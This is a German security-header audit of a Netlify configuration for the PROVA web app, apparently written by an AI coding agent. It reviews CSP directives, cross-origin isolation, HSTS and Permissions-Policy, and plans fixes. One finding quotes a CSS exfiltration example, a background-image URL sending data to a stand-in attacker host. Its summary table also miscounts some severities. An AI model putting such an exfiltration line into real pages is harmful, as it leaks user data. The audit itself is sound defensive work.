# Audit 7 — CSP + Security-Headers

**Datum:** 02.05.2026
**Sprint:** S6 Phase 1
**Auditor:** Claude Code
**Methodik:** statische Analyse `netlify.toml` Block `[[headers]]`. Live-Header-Test gegen `prova-systems.de` und `app.prova-systems.de` ist Marcel-Aktion (curl aus Marcels Internet, nicht Sandbox).

---

## Vorhandene Security-Headers (`netlify.toml` Zeilen 630-638)

```toml
Strict-Transport-Security = "max-age=31536000; includeSubDomains"
X-Frame-Options           = "SAMEORIGIN"
X-Content-Type-Options    = "nosniff"
Referrer-Policy           = "strict-origin-when-cross-origin"
Permissions-Policy        = "microphone=(self), camera=(self), geolocation=(), payment=(self)"
Content-Security-Policy   = "[siehe unten]"
```

### CSP-Direktiven

```
default-src 'self';
script-src 'self' 'unsafe-inline' https://identity.netlify.com https://js.stripe.com https://esm.sh https://cdn.jsdelivr.net https://*.supabase.co;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net;
font-src 'self' https://fonts.gstatic.com data:;
img-src 'self' data: blob: https:;
media-src 'self' blob:;
worker-src 'self' blob:;
frame-src 'self' https://*.stripe.com https://js.stripe.com https://hooks.stripe.com;
connect-src 'self' https://esm.sh https://cdn.jsdelivr.net https://*.netlify.app https://prova-systems.netlify.app https://identity.netlify.com https://api.netlify.com https://api.stripe.com https://api.openai.com https://hook.eu1.make.com https://hook.eu2.make.com https://*.supabase.co wss://*.supabase.co wss:;
frame-ancestors 'self';
object-src 'none';
base-uri 'self';
```

---

## Findings

### HIGH-1 — `script-src 'unsafe-inline'`

**Zeile:** 638 (`script-src` Direktive)

**Problem:** alle Inline-Scripts (`<script>...</script>`) sind erlaubt. XSS-Schutz reduziert: wenn jemals ein User-Input ungeescaped in HTML landet, kann er Scripts ausführen.

**Best-Practice:** nonce-basiert (`script-src 'self' 'nonce-RANDOMVALUE'`) oder Inline-Scripts externalisieren in `*.js`-Files.

**Aufwand für Fix:** ⚠️ groß. PROVA hat ~50+ Inline-Scripts in HTML-Pages. Migration auf nonce-basiert erfordert:
- Server-Side-Nonce-Generierung pro Request (Netlify Edge Functions oder Frontend-Build-Step)
- Alle Inline-Scripts mit `nonce="..."` versehen
- ODER Inline-Scripts in externe Files extrahieren

**Severity:** HIGH (Risiko-Reduktion bei XSS) — aber **nicht in Phase 1.9 fixbar** (zu groß).

**Empfehlung:** als Sprint-Item in Backlog, vor Pilot-Launch oder zumindest dokumentiert in `SECURITY.md` als „Roadmap-Punkt".

---

### HIGH-2 — Fehlende Cross-Origin-Isolation-Header

**Fehlend:**
- `Cross-Origin-Opener-Policy` (COOP)
- `Cross-Origin-Embedder-Policy` (COEP)
- `Cross-Origin-Resource-Policy` (CORP)

**Problem:** Cross-Origin-Isolation ist moderne Best-Practice gegen Spectre/Meltdown-class und Cross-Origin-Attacks (z.B. Cross-Window-Manipulation).

**Empfehlung:**
```toml
Cross-Origin-Opener-Policy   = "same-origin-allow-popups"  # erlaubt Stripe-Checkout-Popup
Cross-Origin-Embedder-Policy = "credentialless"            # weniger restriktiv als require-corp
Cross-Origin-Resource-Policy = "same-origin"
```

**Aufwand für Fix:** klein (5 Min) — drei Header in `netlify.toml` ergänzen.

**Risiko durch Fix:** mittel — Stripe-Checkout / Stripe-Embedded-Pricing kann brechen wenn COOP zu strikt. Daher `same-origin-allow-popups` statt `same-origin`.

**Severity:** HIGH (relevant für Audit-Compliance, OWASP ASVS V14.6.1)
**Phase 1.9 Fix:** ✅ ja

---

### MEDIUM-1 — `style-src 'unsafe-inline'`

**Zeile:** 638

**Problem:** alle Inline-Styles erlaubt. Geringeres Risiko als script-src, aber bei XSS kann CSS-Exfiltration genutzt werden (z.B. `background-image: url(https://attacker.com/?data=...)`).

**Best-Practice:** nonce-basiert oder Styles externalisieren.

**Aufwand für Fix:** groß (analog HIGH-1).

**Severity:** MEDIUM
**Phase 1.9 Fix:** nein, Backlog

---

### MEDIUM-2 — `https://identity.netlify.com` in CSP (legacy, nicht mehr genutzt)

**Zeile:** 638 (script-src + connect-src)

**Problem:** Netlify Identity wurde durch Voll-Supabase-Refactor (Sprint K-1.0 bis K-1.5) ersetzt. Die CSP-Einträge sind tot.

**Severity:** MEDIUM (Dead-Code in Security-Config — obwohl harmlos, signalisiert Pflege-Defizit)
**Phase 1.9 Fix:** ✅ ja — beide Vorkommen entfernen

---

### MEDIUM-3 — `connect-src https://*.netlify.app` Wildcard

**Zeile:** 638

**Problem:** Wildcard erlaubt Calls an JEDE `*.netlify.app`-Subdomain. Bei Compromise eines anderen Netlify-Projekts könnte Cross-Site-Request-Smuggling möglich werden.

**Aktuelle PROVA-Nutzung:** scheint nur `https://prova-systems.netlify.app` zu brauchen (steht direkt daneben, redundant).

**Severity:** MEDIUM
**Phase 1.9 Fix:** ✅ ja — Wildcard entfernen, nur explizite Subdomain

---

### MEDIUM-4 — `connect-src wss:` ohne Restriction

**Zeile:** 638 (am Ende der connect-src)

**Problem:** alle WebSocket-Verbindungen erlaubt (jede Domain). Sollte auf `wss://*.supabase.co` begrenzt sein (das steht ohnehin schon).

**Severity:** MEDIUM
**Phase 1.9 Fix:** ✅ ja — `wss:` raus, `wss://*.supabase.co` reicht

---

### MEDIUM-5 — `connect-src` enthält Make.com (Sprint-K-1.5-Plan: raus)

**Zeile:** 638
```
https://hook.eu1.make.com https://hook.eu2.make.com
```

**Problem:** Voll-Supabase-Refactor sollte Make.com komplett ersetzen (Edge Functions + pg_cron). Solange Make T3/F1 nicht aktiviert/migriert ist, bleibt das drin. Ist eher Architektur-Drift als CSP-Problem.

**Severity:** INFO (geplante Migration, nicht akut)
**Action:** in `MARCEL-PFLICHT-AKTIONEN.md` Make T3/F1 aktivieren, danach Cleanup-Sprint die Hooks aus CSP entfernen

---

### LOW-1 — HSTS fehlt `preload`

**Zeile:** 633
```
Strict-Transport-Security = "max-age=31536000; includeSubDomains"
```

**Problem:** Ohne `preload`-Direktive kann PROVA nicht in die HSTS-Preload-Liste eingetragen werden (Browser-Hardcoded HTTPS für die Domain).

**Empfehlung:**
```
Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
```

Plus Eintrag in `https://hstspreload.org` (Marcel-Action).

**Severity:** LOW
**Phase 1.9 Fix:** ✅ ja — `preload` ergänzen (Vor-Eintrag in HSTS-List ist Marcel-Aktion danach)

---

### LOW-2 — `img-src https:` (Wildcard)

**Zeile:** 638

**Problem:** alle HTTPS-Bilder erlaubt. Ein Angreifer könnte über XSS einen Image-Tag mit beliebiger URL injektieren (Tracking, IP-Logging).

**Best-Practice:** explizite Allow-List (z.B. Stripe-Logo, Supabase-Storage, fonts.gstatic).

**Realität-Check:** PROVA lädt Foto-Uploads von Supabase-Storage und ggf. von externen URLs (Briefkopf-Logos). Restriktiver wäre erlaubt nur `https://*.supabase.co` und Stripe-Domains.

**Severity:** LOW
**Phase 1.9 Fix:** nein, Backlog (braucht Test ob alle Bilder noch laden)

---

### LOW-3 — externe CDNs ohne SRI (Subresource Integrity)

**Zeile:** 638
- `https://esm.sh` (Node-Module-CDN)
- `https://cdn.jsdelivr.net` (npm-CDN)
- `https://js.stripe.com` (Stripe.js)

**Problem:** bei CDN-Compromise hätten Angreifer JS-Code-Ausführung. SRI (`<script src="..." integrity="sha384-..."></script>`) prüft Hash gegen Erwartungswert.

**Realität-Check:** PROVA-Code-Audit nötig — welche externen Scripts werden geladen, mit oder ohne SRI?

**Severity:** LOW (schwer ausnutzbar, Stripe selber wird gut geschützt)
**Phase 1.9 Fix:** nein, Backlog

---

### INFO-1 — `X-Frame-Options: SAMEORIGIN` + `frame-ancestors 'self'`

**Zeilen:** 634, 638

**Beobachtung:** beide sagen das gleiche. `X-Frame-Options` ist obsolet (rfc 7034), `frame-ancestors` ist die moderne Replacement. Ist harmlos, beide bleiben drin.

**Severity:** INFO
**Action:** keine

---

### INFO-2 — `Permissions-Policy` deckt nicht alle Features ab

**Zeile:** 637
```
microphone=(self), camera=(self), geolocation=(), payment=(self)
```

**Beobachtung:** vorhanden für die wichtigen 4 Features. Empfehlung für vollständige Härtung:
```
Permissions-Policy: accelerometer=(), autoplay=(), camera=(self), 
  cross-origin-isolated=(), display-capture=(), encrypted-media=(), 
  fullscreen=(self), geolocation=(), gyroscope=(), keyboard-map=(), 
  magnetometer=(), microphone=(self), midi=(), payment=(self), 
  picture-in-picture=(), publickey-credentials-get=(self), 
  screen-wake-lock=(), sync-xhr=(self), usb=(), web-share=(self), 
  xr-spatial-tracking=()
```

**Severity:** INFO
**Phase 1.9 Fix:** ✅ ja — vollständigere Liste setzen (~5 Min)

---

## Per-Path-Header-Audit

| Path | Cache-Control | Bewertung |
|---|---|---|
| `/*.html` | `no-cache, no-store, must-revalidate` | ✅ korrekt für Auth-protected Content |
| `/sw.js` | `no-cache, no-store, must-revalidate` | ✅ Service-Worker muss frisch sein |
| `/sw-register.js` | `public, max-age=3600` | ✅ akzeptabel |
| `/manifest.json` | `public, max-age=3600` | ✅ akzeptabel |
| `/icons/*` | `public, max-age=86400` | ✅ Icons sind statisch |
| `/.netlify/functions/*` | `no-cache, no-store, must-revalidate` | ✅ API-Responses |

**Beobachtung:** keine `Cache-Control` für `/*.js`/`/*.css` außerhalb `sw-register.js`. Default-Netlify-Cache greift, sollte mit `no-cache` für PWA-Content explizit gesetzt werden — das aber widerspricht ggf. SW-Caching-Strategie.

**Severity:** INFO

---

## Severity-Zusammenfassung

| Severity | Anzahl | Phase-1.9-Fix? |
|---|---:|---|
| CRITICAL | 0 | – |
| HIGH | 2 | 1 (COOP/COEP/CORP). HIGH-1 (unsafe-inline) → Backlog |
| MEDIUM | 5 | 4 (Identity raus, Wildcard `*.netlify.app`, `wss:`, Permissions-Policy-Erweiterung). 1 → Backlog (Make.com — Marcel-Migration). 1 → Backlog (style-src unsafe-inline) |
| LOW | 3 | 1 (HSTS preload). 2 → Backlog (img-src, SRI) |
| INFO | 2 | 0 (akzeptiert) |

**Phase-1.9-Fixes:** 6 Header-Verbesserungen in `netlify.toml`:
1. COOP/COEP/CORP-Header ergänzen
2. `https://identity.netlify.com` aus CSP entfernen (script-src + connect-src)
3. `https://*.netlify.app` Wildcard aus connect-src entfernen
4. `wss:` aus connect-src entfernen (`wss://*.supabase.co` reicht)
5. HSTS `preload` ergänzen
6. Permissions-Policy auf vollständige Liste erweitern

**Backlog (Folge-Sprint):**
- HIGH-1: `script-src 'unsafe-inline'` durch nonce-basiert ersetzen (Architektur-Sprint)
- MEDIUM-2: `style-src 'unsafe-inline'` durch nonce-basiert ersetzen
- MEDIUM-5: Make.com aus CSP entfernen (nach T3/F1-Migration)
- LOW-2: `img-src` Wildcard auf Allow-List
- LOW-3: SRI für externe CDNs

---

## Reproduktion (Live-Header-Test)

**Marcel-Action** (CC nicht aus Sandbox, Curl gegen Live-Domain):

```bash
curl -I -L https://prova-systems.de/ | grep -E "^(strict|content-security|x-frame|x-content|referrer|permissions|cross-origin|cache-control)" -i
curl -I -L https://app.prova-systems.de/dashboard | grep -E "^(strict|content-security|x-frame|x-content|referrer|permissions|cross-origin|cache-control)" -i
```

Erwartung nach Phase-1.9-Fixes:
- COOP/COEP/CORP-Header gesetzt
- HSTS hat `preload`
- CSP ohne `identity.netlify.com`, `*.netlify.app`, `wss:`-Wildcard
- Permissions-Policy vollständige Liste

---

## Online-Tools für Re-Verifikation

- `https://securityheaders.com/?q=https://app.prova-systems.de` — Grade A erwarten nach Phase 1.9
- `https://observatory.mozilla.org/analyze/app.prova-systems.de` — Grade B+ erwarten (HIGH-1 unsafe-inline drückt auf A)
- `https://hstspreload.org/?domain=prova-systems.de` — Eligibility nach `preload`-Direktive

---

*Audit 7 abgeschlossen 02.05.2026 nachmittags*
